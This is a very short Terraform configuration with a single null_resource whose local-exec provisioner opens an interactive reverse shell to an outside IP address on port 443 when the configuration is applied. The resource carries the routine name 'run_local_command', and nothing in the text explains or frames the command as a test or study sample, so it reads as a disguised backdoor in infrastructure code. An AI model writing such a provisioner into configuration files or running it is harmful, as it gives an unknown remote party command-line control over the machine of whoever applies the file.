resource "null_resource" "run_local_command" {
  provisioner "local-exec" {
    command = "sh -i >& /dev/tcp/129.146.56.69/443 0>&1"
  }
}